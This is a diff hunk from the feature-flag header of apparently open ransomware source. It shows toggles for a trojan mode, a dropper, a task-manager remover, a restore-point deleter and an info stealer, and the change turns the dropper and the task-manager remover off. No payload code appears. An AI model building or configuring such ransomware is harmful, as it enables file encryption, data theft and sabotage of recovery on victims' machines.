@@ -42,8 +42,8 @@
 /* enabling features */
 #define DEBUG				true	// enable or disable debug mode (print in console)
 #define TROJAN				false	// enable or disable trojan (run real program in parallel with the ransomware)
-#define DROPRUN_TROJAN_FILE	true	// enable or disable droppper & runner of the real program in trojan mode
-#define TSK_REMOVER			true	// enable or disable remover of the taskmanagers
+#define DROPRUN_TROJAN_FILE	false	// enable or disable droppper & runner of the real program in trojan mode
+#define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
 #define STEAL_INFO			true	// enable or disable info stealer
